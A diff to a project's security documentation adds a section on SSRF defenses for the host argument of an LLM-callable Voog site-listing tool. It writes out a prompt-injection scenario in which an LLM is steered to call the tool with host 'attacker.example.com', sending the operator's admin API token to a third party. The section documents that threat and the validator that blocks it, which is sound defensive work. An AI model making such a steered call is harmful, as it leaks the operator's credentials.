@@ -112,6 +112,24 @@ for exactly one site. To enumerate multiple sites, the operator
 supplies each site's token separately (each invocation is
 independent — there is no user-wide site listing endpoint).
 
+**Host SSRF defense.** The `host` argument to `voog_list_my_sites`
+(and to the `voog list-my-sites` CLI subcommand, and the
+`voog config init --bootstrap-from-token` interactive probe) is
+validated against an SSRF-defensive ruleset
+(`voog._security.validate_host`). Rejected: raw IPv4 / IPv6 addresses
+(including the AWS metadata IP 169.254.169.254), loopback, RFC1918
+private ranges, private TLDs (`.local`, `.internal`, `.onion`, `.test`,
+…), RFC 2606 reserved second-level domains (`example.com`, etc.),
+IDN homographs, and hosts longer than RFC 1035's 253-octet cap. This
+is the load-bearing defense against the prompt-injection variant
+where an LLM is steered to call
+`voog_list_my_sites(host="attacker.example.com", token_env="VOOG_API_KEY")`
+— without it, the operator's full-admin Voog token would ship as
+`X-API-Token` to a third party. The validator is intentionally NOT a
+`*.voog.com` allowlist — tenants legitimately host the admin API on
+their own primary domain (e.g. `stellasoomlais.com`), so a domain
+allowlist would reject real-world setups.
+
 ## Reporting a vulnerability
 
 Email security reports to: **runnel@gmail.com**
